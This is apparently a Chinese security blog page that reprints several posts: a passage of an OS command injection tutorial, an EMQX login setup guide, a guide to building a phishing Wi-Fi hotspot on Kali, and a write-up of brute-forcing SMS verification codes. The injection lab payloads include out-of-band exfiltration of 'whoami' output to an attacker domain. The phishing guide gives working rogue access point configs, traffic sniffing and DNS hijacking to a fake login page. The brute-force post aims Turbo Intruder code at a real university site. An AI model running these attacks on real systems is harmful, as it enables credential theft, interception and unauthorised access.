-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error - productID was not provided</span><br><span class="line">aiwefwlguh</span><br><span class="line">29: command not found</span><br></pre></td></tr></table></figure>
-
-<p>输出的三行表明：</p>
-<p>原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。</p>
-<p>执行注入的echo命令，并且在输出中回显提供的字符串。</p>
-<p>原始参数29作为命令执行，从而导致错误。</p>
-<p>通常，将附加命令分隔符&amp;放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事件阻止注入的命令执行的可能性。</p>
-</blockquote>
-<h4><span id="lab-os-command-injection-simple-case">Lab: OS command injection, simple case</span></h4><blockquote>
-<p><code>productId=1&amp;storeId=1|whoami</code></p>
-<p><img src="/2023/12/07/OS-Command-Injection/2.png" alt="image"></p>
-</blockquote>
-<h3><span id="有用的命令">有用的命令</span></h3><blockquote>
-<p>当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：</p>
-<table>
-<thead>
-<tr>
-<th>命令目的</th>
-<th>Linux</th>
-<th>Windows</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>当前用户的名称</td>
-<td>whoami</td>
-<td>whoami</td>
-</tr>
-<tr>
-<td>操作系统</td>
-<td>uname -a</td>
-<td>ver</td>
-</tr>
-<tr>
-<td>网络配置</td>
-<td>ifconfig</td>
-<td>ipconfig &#x2F; all</td>
-</tr>
-<tr>
-<td>网络连接</td>
-<td>netstat -an</td>
-<td>netstat -an</td>
-</tr>
-<tr>
-<td>运行进程</td>
-<td>ps -ef</td>
-<td>tasklist</td>
-</tr>
-</tbody></table>
-</blockquote>
-<h2><span id="操作系统命令注入漏洞盲注">操作系统命令注入漏洞盲注</span></h2><blockquote>
-<p>OS命令注入的许多实例都是盲注的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。</p>
-<p>考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：</p>
-<p><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
-<p>mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。</p>
-</blockquote>
-<h3><span id="使用时间延迟检测盲注os命令注入">使用时间延迟检测盲注OS命令注入</span></h3><blockquote>
-<p>您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：</p>
-<p><code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
-<p>此命令将导致应用程序ping其环回网络适配器10秒钟。</p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS command injection with time delays</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=j25Ci6owysrme8z4HvkicgC1hqXWr0Yz&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1&amp;message=1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="通过重定向输出来利用盲注os命令注入">通过重定向输出来利用盲注OS命令注入</span></h3><blockquote>
-<p>您可以将注入命令的输出重定向到Web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置&#x2F;var&#x2F;www&#x2F;static提供静态资源，则可以提交以下输入：</p>
-<p><code>&amp; whoami&gt; /var/www/static/whoami.txt &amp;</code></p>
-<p><code>&gt;</code>字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取<a target="_blank" rel="noopener" href="https://vulnerable-website.com/whoami.txt%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。</a></p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-output-redirection">Lab: Blind OS command injection with output redirection</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;email=1%401.com||whoami+&gt;+/var/www/images/whoami.txt||&amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="利用带外oast技术利用盲目的os命令注入">利用带外（OAST）技术利用盲目的OS命令注入</span></h3><blockquote>
-<p>您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：</p>
-<p><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code></p>
-<p>此有效负载使用nslookup命令对指定的域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。</p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab: Blind OS command injection with out-of-band interaction</span></h4><blockquote>
-<p><img src="/2023/12/07/OS-Command-Injection/5.png" alt="image"></p>
-<p>带外通道还提供了一种从注入的命令中提取输出的简便方法：<br> (根本别啥用)</p>
-<p><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
-<p>这将导致对DNS的攻击者所在域进行域名查询，其中包含whoami命令的结果：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wwwuser.kgji2ohoyw.web-attacker.com</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab: Blind OS command injection with out-of-band data exfiltration</span></h4><blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1%401.com||nslookup+`whoami`.132kftea48t801xjselcncwfp6vwjl.burpcollaborator.net||</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="注入os命令的方式">注入OS命令的方式</span></h2><blockquote>
-<p>各种shell字符可用于执行OS命令注入攻击。</p>
-<p>许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符可在基于Windows和Unix的系统上运行：</p>
-<pre><code>&amp;
-&amp;&amp;
-|
-||
-</code></pre>
-<p>以下命令分隔符仅在基于Unix的系统上起作用：</p>
-<pre><code>;
-Newline (0x0a or \n)
-</code></pre>
-<p>在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令中内嵌执行注入命令： （原来如此，windows不能用反引号）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected-command`</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">( injected-command )</span></span><br></pre></td></tr></table></figure>
-
-<p>请注意，不同的shell元字符具有细微不同的行为，这些行为可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲注使用有用。</p>
-<p>有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用”或’），然后再使用适当的外壳元字符来插入新命令。</p>
-</blockquote>
-<h2><span id="如何防止os命令注入攻击">如何防止OS命令注入攻击</span></h2><blockquote>
-<p>到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。</p>
-<p>如果认为无法通过用户提供的输入调出OS命令，则必须执行强大的输入验证。 有效验证的一些示例包括：</p>
-<ul>
-<li>根据 允许值 的白名单进行验证。</li>
-<li>验证输入是否为数字。</li>
-<li>验证输入仅包含字母数字字符，不包含其他语法或空格。</li>
-</ul>
-<p>切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/07/EMQX-Server-Login/">
-                配置EMQX服务器用户名/密码方式登录
-            </a>
-        </h2>
-    
-    <time>
-        Dec 7, 2023
-    </time>
-    <section class="content">
-        <h1><span id="配置emqx服务器用户名x2f密码方式登录">配置EMQX服务器用户名&#x2F;密码方式登录</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/cw_huang/article/details/105815345">GEEK.攻城狮</a> 并作补充</p>
-</blockquote>
-<h3><span id="配置环境">配置环境</span></h3><blockquote>
-<p><strong>系统：</strong><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ubuntu&spm=1001.2101.3001.7020">ubuntu</a> 18.04server lts</p>
-<p><strong>EMQX版本：v4.0.6</strong></p>
-</blockquote>
-<h3><span id="停止服务">停止服务</span></h3><blockquote>
-<p><code>emqx stop</code></p>
-</blockquote>
-<h3><span id="编辑用户名密码配置文件">编辑用户名密码配置文件</span></h3><blockquote>
-<p><code>vim ./etc/emqx/plugins/emqx_auth_username.conf</code></p>
-<p>增加用户名、密码，密码算法改为plain，透传</p>
-<p><img src="/2023/12/07/EMQX-Server-Login/1.png" alt="image"></p>
-</blockquote>
-<h3><span id="关闭匿名登录">关闭匿名登录</span></h3><blockquote>
-<p><code>vim /etc/emqx/emqx.conf</code></p>
-<p>查找allow_anonymous，修改为false</p>
-<p><img src="/2023/12/07/EMQX-Server-Login/2.png" alt="image"></p>
-<p>启动emqx服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emqx start</span><br></pre></td></tr></table></figure>
-
-
-
-<p>进入后台管理界面，启动用户名密码认证。</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://服务器IP:18083</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/EMQX-Server-Login/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="此时使用mqtt之前的匿名方式的配置已经无法登录">此时，使用MQTT之前的匿名方式的配置，已经无法登录</span></h3><blockquote>
-<p><img src="/2023/12/07/EMQX-Server-Login/4.png" alt="image"></p>
-<p>MQTT.FX上，添加用户名密码：</p>
-<p><img src="/2023/12/07/EMQX-Server-Login/5.png" alt="image"></p>
-<p>此时可以通过用户名密码登录，订阅主题</p>
-<p><img src="/2023/12/07/EMQX-Server-Login/6.png" alt="image"></p>
-<p>同样的方式，我们需要再添加一个用户，用于两个用户之间通讯。</p>
-<p>我们可以从服务器端登录一个用户，向MQTT.FX客户端订阅的TOPIC发送信息。可以看到正常收到。</p>
-<p><img src="/2023/12/07/EMQX-Server-Login/7.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/EMQX/" rel="tag">EMQX</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/Fishing-WiFi/">
-                kali搭建钓鱼WiFi
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="kali搭建钓鱼wifi">kali搭建钓鱼WiFi</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.bbskali.cn/2179.html">逍遥子</a> 并作补充</p>
-<p>如何在kali下快速搭建钓鱼WiFi呢？全网最简单最详细的教程核能来袭。一起来看看吧。</p>
-</blockquote>
-<h2><span id="准备">准备</span></h2><blockquote>
-<ul>
-<li>USB无线网卡（推荐8187 3070）</li>
-<li>hostapd dnsmasq apache2</li>
-<li>kali2020(最新版)</li>
-</ul>
-</blockquote>
-<h3><span id="配置无线网卡">配置无线网卡</span></h3><blockquote>
-<p>在终端执行 <code>ifconfig</code>查看是否有 <code>wlan0</code>如果存在，我们需要激活为监听模式。执行命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/Fishing-WiFi/1.png" alt="image" title="开启网卡监听模式"></p>
-</blockquote>
-<h3><span id="配置hostapd">配置hostapd</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim hostapd.conf</span><br></pre></td></tr></table></figure>
-
-<p>写入下面内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">driver=nl80211</span><br><span class="line">ssid=Chinanet <span class="comment">#无线名称 随意即可</span></span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">ignore_broadcast_ssid=0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/Fishing-WiFi/2.png" alt="image"></p>
-</blockquote>
-<h3><span id="配置dnsmasq文件">配置dnsmasq文件</span></h3><blockquote>
-<p>终端执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dnsmasq.conf</span><br></pre></td></tr></table></figure>
-
-<p>写入内容如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h</span><br><span class="line">dhcp-option=3, 192.168.1.1</span><br><span class="line">dhcp-option=6, 192.168.1.1</span><br><span class="line">server=8.8.8.8</span><br><span class="line">log-queries</span><br><span class="line">log-dhcp</span><br><span class="line">listen-address=127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/Fishing-WiFi/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="配置防火墙和端口转发">配置防火墙和端口转发</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</span><br><span class="line">iptables --append FORWARD --in-interface wlan0mon -j ACCEPT</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/Fishing-WiFi/4.png" alt="image"></p>
-<p>这样做的目的是保证我们的鱼儿能够正常上网。</p>
-</blockquote>
-<h3><span id="给无线网卡分配ip地址">给无线网卡分配IP地址</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0</span><br><span class="line">route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h3><span id="启动钓鱼热点">启动钓鱼热点</span></h3><blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostapd hostapd.conf</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/06/Fishing-WiFi/5.png" alt="image"></p>
-<p>这样我们便可以看到有一个 <code>china-net</code>的热点，但是不能连接，不要着急，我们启动dnsmasq即可。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq -C dnsmasq.conf -d</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这样，我们的热点便可以正常连接并上网了。</p>
-<p><img src="/2023/12/06/Fishing-WiFi/6.png" alt="image"></p>
-<p>左边为连接的设备，右边有设备访问的网站信息。</p>
-</blockquote>
-<h2><span id="高级操作">高级操作</span></h2><h3><span id="嗅探目标图片">嗅探目标图片</span></h3><blockquote>
-<p>在终端执行</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0mon</span><br></pre></td></tr></table></figure>
-
-
-
-<p>便可以看到目标访问的站点图片信息。</p>
-<p><img src="/2023/12/06/Fishing-WiFi/7.png" alt="image"></p>
-</blockquote>
-<h3><span id="中间人攻击">中间人攻击</span></h3><h4><span id="域名重定向">域名重定向</span></h4><blockquote>
-<p>修改 <code>/etc/ettercap/etter.dns</code>文件，添加内容如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com      A   192.168.1.1</span><br><span class="line">*.baidu.com    A   192.168.1.1</span><br><span class="line">www.baidu.com  PTR 192.168.1.1</span><br></pre></td></tr></table></figure>
-
-
-
-<p>即，当我们访问百度，自动跳转到本地。<br>开启本地 <code>apache</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
-
-
-
-<p>将做好的钓鱼页面放到 <code>/var/www/html</code>目录下，然后终端执行 <code>ettercap -G</code>利用 <code>ettercap</code>进行DNS劫持，具体做法这里不再诉述。</p>
-<p><img src="/2023/12/06/Fishing-WiFi/8.png" alt="image" title="仿电信钓鱼页面"></p>
-<p>当然，你也可以对目标进行数据包的捕获和分析，我们这里也不再说了。</p>
-</blockquote>
-<h3><span id="填个坑">填个坑</span></h3><blockquote>
-<p>有不少人搭建完成后，反应上不了网，是因为dns冲突了。如你家的路由器的网段是<code>192.168.1.1/24</code>而在dns的配置文件中<code>dhcp-option=3, 192.168.1.1</code>这样会冲突，解决办法很简单，把<code>192.168.1.1</code>改成其他网段就行了，如<code>192.168.5.1</code>，但是后面的规则也要改。最简单的方法就是登陆路由器，将<code>lan</code>口地址<code>192.168.1.1</code>改掉就行了！</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fishing/" rel="tag">Fishing</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/06/Burpsuite-Turbo-Intruder/">
-                记一次使用Burpsuite下的插件Turbo intruder进行实战
-            </a>
-        </h2>
-    
-    <time>
-        Dec 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="记一次使用burpsuite下的插件turbo-intruder进行实战">记一次使用Burpsuite下的插件Turbo intruder进行实战</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243953.html">酷酷的繁星</a> 并作补充</p>
-<p>相信很多师傅在进行渗透测试或者漏洞挖掘的时候都会用到burpsuite这款神器，但是不知道师傅们用过burpsuite里面一款叫turbo intruder的插件么</p>
-<p>不管这些，今天看了这篇文章的师傅我相信也会对这款插件有兴趣</p>
-<p>安装教程等等的文章在各大论坛一找一大堆，但是实战的又有几个呢，对吧？</p>
-<p>今天繁星就给大家带来turbo intruder实战教程</p>
-<p>目标站点是某科技大学的站点</p>
-<p>首先我们打开这个站点的首页看看</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/1.png" alt="image"></p>
-<p>可以看到有注册按钮</p>
-<p>我们点进去看看</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/2.png" alt="image"></p>
-<p>然后在这里推荐师傅们一个很便利的短信接收平台</p>
-<p><a target="_blank" rel="noopener" href="https://www.bfkdim.com/">https://www.bfkdim.com/</a></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/3.png" alt="image"></p>
-<p>好的，继续</p>
-<p>手机号那里我们就填这个平台里面的一个手机号</p>
-<p>开启我们的burpsuite，点“立即注册”抓个包</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/4.png" alt="image"></p>
-<p>选择验证码右键</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/5.png" alt="image"></p>
-<p>发送到turbo intruder</p>
-<p>我们这边不同官方的代码</p>
-<p>爆破验证码只需生成数字的所有排列组合就可以了，可以通过以下代码来生成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">   pattern = &#x27;1234567890&#x27;</span><br><span class="line">   for i in list(product(pattern, repeat=length)):</span><br><span class="line">        code =  &#x27;&#x27;.join(i)</span><br><span class="line">        engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">   engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">           concurrentConnections=30,</span><br><span class="line">           requestsPerConnection=100,</span><br><span class="line">           pipeline=True</span><br><span class="line">           )</span><br><span class="line">   brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line"> if &#x27;error&#x27; not in req.response:</span><br><span class="line">      table.add(req)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>复制这段代码替换掉默认的</p>
-<p>然后点击最下方攻击</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/6.png" alt="image"></p>
-<p>我们可以看到各种数据，这速度反正我是爱了，师傅们还没爱吗</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/7.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/8.png" alt="image"></p>
-<p>我们可以看到响应包，没有什么限制，所以我们可以继续进行枚举</p>
-<p>PS：拿turbo intruder枚举有时候会崩，不用慌，关掉再来一遍就行了</p>
-<p>由于本人电脑配置太水加上网络慢，所以还没枚举完验证码就过期了，跟我一样的师傅可以尝试多几次</p>
-<p>经过两个小时的奋战后，终于…….</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/9.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/10.png" alt="image"></p>
-<p>被ban了</p>
-<p><img src="/11.png" alt="image"></p>
-<p>没有办法只能换个手机号继续搞</p>
-<p>重复做了一遍之后</p>
-<p>当我再点击获取验证码，提示该手机号已经注册，这意味着什么？意味着刚刚的枚举成功了，我们回到turbo intruder找下响应包</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/12.png" alt="image"></p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/13.png" alt="image"></p>
-<p>响应包的字节是55，与其它的包不一样所以就是这个了</p>
-<p>可以看到响应包，提示success</p>
-<p>再看看其它的响应包</p>
-<p>这个字节76的是验证码错误</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/14.png" alt="image"></p>
-<p>字节88的是该手机已被注册</p>
-<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/15.png" alt="image"></p>
-<p>我们会发现前面的全是字节76后面的全88那我们要在76和88的交界部分找成功的包</p>
-<p>另外，再声明一下，这篇文章是介绍turbo intruder的实战，重点在turbo intruder，有的师傅可能会觉得注册处爆破验证码并没什么用，但是大家想想，注册处爆破验证码的原理和找回密码处爆破验证码的原理有什么区别？再大胆点想象一下，要是管理员登录处有找回密码这一功能呢？对吧？</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
